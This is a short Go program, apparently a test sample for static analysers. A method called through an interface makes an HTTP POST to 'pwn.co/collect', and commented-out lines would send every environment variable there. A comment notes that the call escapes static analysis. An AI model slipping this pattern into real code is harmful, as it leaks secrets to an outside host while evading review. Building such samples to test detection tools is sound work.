package main

import (
	//"os"
	//"os/exec"
      	//"encoding/json"
	"net/http"
	//"bytes"
)

type Fooer interface {
	Foo()
}

type Bar struct{}

func (b Bar) Foo() {
        //cmd := exec.Command("ls")
        //cmd.Stdout = os.Stdout
        //_ = cmd.Run()

// 	jsonPayload,_ := json.Marshal(os.Environ())
//      payloadBuffer := bytes.NewBuffer(jsonPayload)

        // Perform the HTTP POST request
        response, _ := http.Post("http://pwn.co/collect", "application/json", nil)
        defer response.Body.Close()

}

func invokeFoo(f Fooer) {
	f.Foo() // Method invocation not captured by static analysis if Fooer implementation is determined at runtime
}

func main() {
	var b Bar
	invokeFoo(b)
}
